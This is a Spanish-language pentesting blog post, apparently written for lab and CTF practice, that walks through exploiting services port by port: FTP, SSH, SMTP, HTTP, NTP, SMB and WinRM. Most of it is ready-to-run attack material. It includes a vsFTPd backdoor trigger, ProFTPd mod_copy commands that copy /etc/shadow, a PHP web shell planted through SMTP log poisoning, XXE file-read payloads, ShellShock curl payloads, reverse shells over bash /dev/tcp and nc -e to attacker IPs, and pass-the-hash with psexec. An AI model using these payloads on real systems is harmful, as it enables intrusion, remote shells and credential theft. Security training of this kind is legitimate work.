---
layout: single
title: Explotacion de puertos.
excerpt: "Aqui veremos como explotar algunas vulnerabilidades dependiendo del puerto que se este auditando."
date: 2022-11-20
classes: wide
header:
  teaser_home_page: true
categories:
  - Pentesting
  - Ethical Hacking
tags:
  - FTP
  - SSH
  - WinRM
  - SMB
  - Puertos
  - HTTP/HTTPS
---

Sino sabes por donde empezar al momento de encontrarte con uno de estos puertos aqui te enseño algunas cosas que deberias de probar cuando estes auditando.

## 21 FTP (File Transfer Protocol).
Protocolo para la tranferencia remota de archivos.
Cuando el puerto 21 este abierto puedes intentar conectarte como el usuario anonymous.
Debes especificar el protocolo seguido de la ip-address víctima. Posteriormente ingresas en el campo username anonnymous y en password lo dejas vacio dando solo enter.
```
 ftp <ip-address> -> username: anonymous
 		     password:
```	  
Estos son algunos de los comandos que puedes utilizar una vez estés conectado al puerto 21 de FTP.<br>
- dir -> Ver los directorios compartidos.
- ls -la -> Listar por archivos ocultos.
- put <name_file> -> Verificar si se tiene capacidad de escritura y así modificar un archivo de la máquina.
  * Ej; put file | put /etc/passwd

<br>  
En caso de que se haya detectado la versión vsFTPd 2.3.44 al hacer el escaneo, debes buscar con la herramienta searchsploit un exploit que te permita explotar un backdoor que tiene esa versión, y así poder ejecutar comandos de forma remota (RCE) y enviarte una reverse shell para ganar acceso al sistema.
<br> 
Con el comando `` searchsploit -x unix/remote/49757.py `` examinas el contenido del exploit para ver como se usa o si tienes que modíficar algunos parámetros.
<br>
Con el comando `` searchsploit -m unix/remote/49757.py `` copias el exploit a la ruta actual de trabajo.
```
searchsploit vsFTPd 2.3.44 -> unix/remote/49757.py -> Backdoor Command Execution
          nc <ip-address> 21 -> USER test:)
	  		     -> PASS pass
          ftp <ip-address> -> test:) 
	  		   -> pass
```
<br><br>
En la versión 1.3.5 de FTP existe una vulnerabilidad que te permite copiar archivos del sistema (CPFR y CPTO) a una ruta que tenga capacidad de lectura (anonymous) haciendo uso del comando `` site cpfr `` y `` site cpto `` sin que tengas que llegar a autenticarte al protocolo FTP.
<br>
<br>
Uso:
```
ftp <ip-address>
-<><>-OK
Name: anonymous
Password:             # Dar enter sin ingresar nada.
530 Login incorrect.
Login failed.
ftp> help	# Con el comando help podras ver los demas comandos que estan disponibles dentro del servicio FTP.
ftp> site help
214-The following SITE commands are recognized
CPFR <sp> pathname 
CPTO <sp> pathname
```
<br>
Para copiar un archivo que como ejemplo sería el archivo /etc/shadow a la ruta /home/\<username\>/share, que en este caso es donde se ha montado el recurso compartido "anonymous" y ademas tiene capacidad de lectura. Para replicar esto en otra máquina tendrías que ver la ruta donde está montado el recurso compartido.
<br>
<br>
Nota: Tambien puedes copiar los archivos en la ruta /var/www/html/ seguido del nombre del archivo con el cual lo vas a guardar, siempre y cuando tenga abierto el puerto 80 o 443.
```
site cpfr /etc/shadow	                        
# Es la ruta donde se situa el archivo que quieres copiar.

site cpto /home/<username>/share/<file_name>	
# Es la ruta a donde se copiará el archivo y <file_name> el nombre con el cual se guardará.
```
<br>
Finalmente lo que tendrías que hacer es listar los recursos compartidos con smbmap y descargar el /etc/shadow para crackear los hashes.
```
smbmap -H <ip-address> -r anonymous

smbmap -H <ip-address> --download /anonymous/shadow
```


<br><br>
## 22 SSH (Secure Shell).
Protocolo usado para conectarse de forma remota a un servidor de forma segura.<br>
Existe un exploit que te ayuda a enumerar usuarios existentes en un servidor si la versión es inferior a 7.7.<br>
Primero buscas un script que te permita explotar la vulnerabilidad con la herramienta searchsploit.
```
searchsploit ssh user enumeration
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                    | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                              | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                              | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                             | linux/remote/40113.txt
------------------------------------------------------------------ ---------------------------------
```

Copias el script.py a la ruta actual para poder ejecutarlo.
```
searchsploit -m linux/remote/45939.py
```

Finalmente ejecutas el exploit con python indicando un usuario, seguido de la dirección IP de la máquina víctima.<br>
- Uso: `` python2 45939.py <user> <ip-address> ``
<br>
<br>
```
python2 45939.py root 192.168.5.65
```


<br><br>
## 25 SMTP (Simple Mail Transfer Protocol).
Protocolo de red de texto plano utilizado para enviar y recibir correos electrónicos lo que hace que las comunicaciones entre el cliente de correo y el servidor de correo puedan ser legibles para cualquier persona que interprete la comunicación. Para evitar esto se utilizan protocolos de cifrado como STARTTLS o DMARC.<br>
Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.
<br>
<br>
<b>Log Poisoning.</b><br>
Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema, el cual contenga código malicioso php y ver si se acontece un <b>Log Poisoning</b> y ejecutar comandos de forma remota RCE (Remote Code Execution), todo esto en caso de que no se requiera de autenticación al momento de conectarse con telnet al puerto 25de SMTP.<br>
Ejemplo:
```
telnet <ip-address> 25
```
<br>
Una vez conectado, esta sería la estructura básica para enviar un correo por SMTP.
```
MAIL FROM: <username>	
# MAIL FROM: Es para específicar el remitente del correo.

RCPT TO: <username>	
# RCPT TO: Es para indicar el resceptor del correo, pero este tiene que ser un usuario válido dentro del sistema.
DATA			                      # Poner el comando DATA y luego dar enter para introducir el mensaje del correo.
<?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
.			                          # Al termino del correo se debe finalizar con un punto.

QUIT			                      # Cortar la conexión.
```
Ya solo queda revisar los logs para veríficar que se haya guardado correctamente en la ruta /var/mail/\<username\>, mediante un LFI (Local File Inclution).<br>
Este sería un ejemplo desde consola usando el comando curl para tramitar la petición al sitio web y ver los logs.
```
curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"

# helios es el nombre de usuario al cual se le envió en correo.
# -s -> Indica que la petición se realizará en formato silencioso. 
# -X -> Este parametro es para específicar el método por el cual se tramitará la petición que en este caso se usa el método GET.
# &cmd=whoami -> Concatenación del parámetro cmd para inyectar el comando whoami y ver si se tiene ejecución remota de comandos "RCE".
```
Para ver los logs desde el sitio web solo basta con poner la url donde se acontece el LFI seguido del parámetro cmd para inyectar los comandos.<br>
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/<username>&cmd=whoami


<br><br>
## 80 HTTP (Hypertext Transfer Protocol).
Protocolo usado para montar sitios web.
Con la herramienta whatweb puedes ver informacion acerca del sitio web como que tipo de CMS "Control Management System" se esta usando ya sea joomla, wordpress o drupal, con que tipo de lenguaje esta programado (php, python, java etc). Tambien puedes ver esta información con wappalyzer que es un plugin que puedes instalar en tu navegador.
```
whatweb http://<ip-addres>
```
<br>
Si hay un escaner de url en el sitio web, crea un archivo y ve si el contenido del archivo te lo muestra en la página al subirlo, prueba si te interpreta código php inyectando un comando.
```
nvim test -> <?php system("whoami"); ?>
http://<ip-addres>/test

Listar el phpinfo para ver las funciones que estan deshabilitadas.
http://<ip-address>/test -> test = <?php phpinfo(); ?>

Intentar escanear la url de la maquina junto con los puertos que tiene abiertos para verificar si hay informacion expuesta o si exiten mas puertos abiertos internamente.
http://127.0.0.1:443
http://localhost:5000
```  
<br>
Si hay un campo para subir archivos probar subiendo un archivo.txt para verificar si se está aplicando sanitización, en caso de que no se esté validando el tipo de archivo que se sube puedes subir un archivo.php malicioso para enviarte una reverse shell.
```
nvim reverse_shell.php -> bash -c 'bash -i >& /dev/tcp/<ip-address>/443 0>&1'
```
<br>
<br>
<b>XXE.</b><br>
Si se aplica validación en archivos.xml se puede acontacer un XXE si el contenido del archivo.xml te lo muestra en la web tal cual. 

Puedes leer el /etc/passwd para ver los usarios que hay en el sistema.

Leer el /proc/net/fib_trie para verificar que no haya contenedores en la máquina víctima.

Listar el /proc/net/tcp para ver los puertos que estan abiertos internamente en la máquina.

Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña (/home/\<user\>/.ssh/id_rsa).
```
<?xml version="1.0" encoding="ISO-8859-1"?>
          <!DOCTYPE foo [  
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    
          <post>
                  <title>Example Post</title>
                  <description>Example Description</description>
                  <markdown>&xxe;</markdown>
          </post>
```
<br>
<br>
<b>ShellShock Attack.</b><br>
Es un ataque que se produce cuando un atacante aprovecha una vulnerabilidad en el intérprete de comandos Bash.El ataque se aprovecha de la falta de validación en la entrada de comandos y permite al atacante ejecutar código malicioso en el sistema.<br><br>
Ejemplo de como se acontece un Shellshock attack en la ruta cgi-bin con el comando `` curl `` modificando el "User-Agent".<br>
Lo que hace el siguiente comando es hacer una petición HTTP al sitio web mediante el método GET enviando una cabecera que contiene código malicioso que permite ejecutar el comando whoami en el sistema para saber quien es el usuario que ejecuta el servidor web.  

```
curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; /usr/bin/whoami"

# -s -> Ejecuta el modo silencioso para que no se muestre el progreso ni la información adicional en la salida.
# -X GET -> Especifica el método HTTP utilizado para la solicitud, en este caso, GET.
# "http://192.168.0.54/cgi-bin/" -> Es la URL a la que se realiza la solicitud.
# -H "User-Agent: () { :; }; /usr/bin/whoami" -> Es un encabezado personalizado que se envía con la solicitud HTTP. 
# Este encabezado establece el User-Agent en () { :; }; /usr/bin/whoami para ejecutar el comando whoami.
```
<br>
En caso de obtener como respuesta un Internal Server Error, es necesario añadir un "echo;" en el User-Agent.
```
curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
<br>
Enviarte una reverse shell explotando la vulnerabilidad ShellShock Attack.
```
curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.0.62/443 0>&1"
```


<br><br>
## UPD 123 NTP (Network Time Protocol)
Protocolo utilizado para sincronizar el reloj de las maquinas conectadas. En ocasiones algunos ataques no suele funcionar sino esta sincronizada tu hora con la de la maquina víctima.
<br>
<br>
Ver si el puerto 123 esta abierto por UDP.
```
nmap --top-ports 500 --open -sU -t5 -vvv -n -Pn <ip-address> -oG udpPorts 
```
<br>
Detectar el servicio que corre en el puerto 123 al igual que la diferencia de tiempo entre tu maquina y la maquina victima.
```
nmap -sU -sCV -p123 ip-address -oN targeted
```
<br>
Se requiere instalar las siguientes librerías:
```
pip3 install pyotp ntplib
```
<br>
Sincronizar tu hora a la de la máquina víctima de forma temporal para obtener un TOTP.
``` 
	#!/usr/bin/python3
	import pyotp
	import ntplib
	from time import ctime
  
        client = ntplib.NTPClient()
        response = client.request("ip-address")
        totp = pyotp.TOTP("aqui_va_otp_token")
  
        print("El token es -> " % totp.at(response.tx_time))
```


<br><br>
## 135 MSRPC


<br><br>
## 443 HTTPS (Hypertext Transfer Protocol Secure)
Inspeccionar el certificado en busca de información relevante, como si se esta aplicando virtual hosting "Common Name" o para ver que emails estan registrados.
```
openssl s_client -connect <ip-address>:443
```


<br><br>
## 139/445 SMB (Server Message Block)
Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.
<br>
<br>
Con este comando puedes ver el nombre de la máquina víctima (Si es controlador del dominio "DC-Admin"), la versión de windows que se esta utilizando y si el SMB esta firmado.
```
crackmapexec smb <ip-address>
```
<br>
Una vez obtenido un usario y contraseña puedes ver si son válidos a nivel de sistema si te pone un [+] en el output.
```
crackmapexec smb <ip-address> -u 'user' -p 'password'
```
<br>
Listar los recursos compartidos que existen a nivel de red empleando un null session sino no se cuenta con credenciales válidas.
```
crackmapexec smb <ip-address> -u 'null' -p ' ' --shares
```
<br>
Hacer PassTheHash para comprobar que el hash que se tiene es del usuario administrator y así poder ganar acceso al sistema sin proporcionar la contraseña con la herramienta psexec.py
```
crackmapexec smb <ip-address> -u 'Administrator' -H ':<hash>'
```
<br>
Si ya tienes el hash NTLM ejecuta el siguiente comando y obtendras una consola como el usuario nt/authority/system.
```
psexec.py WORKGROUP/Administrator@<ip-address> -hashes :<HashNTLM>
```
<br>
Listar los recursos compartidos que hay a nivel de red.
```
smbmap -H <ip-address>
# -H -> Especificar la dirección IP.
```
<br>
Listar los recursos compartidos haciendo uso de un null session.
```
smbmap -H <ip-address> -u 'null'
# -u -> Indicar un usuario.
```
<br>
Listar los recursos compartidos teniendo un usuario y una contraseña validos.
```
smbmap -H <ip-address> -u <username> -p <password>
```
<br>
Especificar el nombre del recurso del servidor al cual se desea conectar.
```
smbmap -H <ip-address> -r <resourcename>
# -r -> Especificar la ruta del recurso al que se quiere conectar.
# El nombre del recurso podría ser anonymous en caso de que exista. 
```
<br>
Descargar un recurso compartido a la ruta actual.
```
smbmap -H <ip-address> --download <resourcename>/<filename>
```
<br>
Listar recursos de la máquina.
```
smbclient -L <ip-address> -N 
```  
En caso de que se presente el error: protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED al querer listar los recursos de la maquina ejecuta el siguiente comando para solucionarlo.
```
smbclient -L ipaddress -N --option 'client min protocol = NT1'
```
<br>
Conectarse a un recurso de la máquina víctima.
```
smbclient //<ip-address>/name_resource -N --option 'client min protocol = NT1'
Ej; smbclient //<ip-address>/tmp -N --option 'client min protocol = NT1'
```
<br>
Una vez conectado a un recurso de la máquina puedes ver si está habilitado el comando logon con el comando `` help ``. Si está habilitado te puedes enviar una reverse shell poniendote en escucha con netcat en el puerto 443.
```
sudo rlwrap ncat -nlvp 443

logon "/='nohup nc -e /bin/bash <ip-address> 443'"
```


<br><br>
## 5985 WinRM (Windows Remote Management)
La administración remota de windows permite que los sistemas accedan o intercambien información de gestión a través de una red común.
<br>
<br>
Para poderte conectar a los servicios remotos de windows primero debes comprobar que el usuario forme parte del grupo Remote Managment User con la herramiente crackmapexec.<br>
Si al final de la ejecución te pone un [+] pwned! significa que el usuario forma parte del grupo Remote Management User.
```
crackmapexec winrm 10.10.11.108 -u 'user' -p 'password' -> [+] pwn3d!
```
<br>
Ya solo queda conectarse al servicio remoto de windows con la herramienta evil-winrm.
```
evil-winrm -i <ip-address> -u 'user' -p 'password'
```




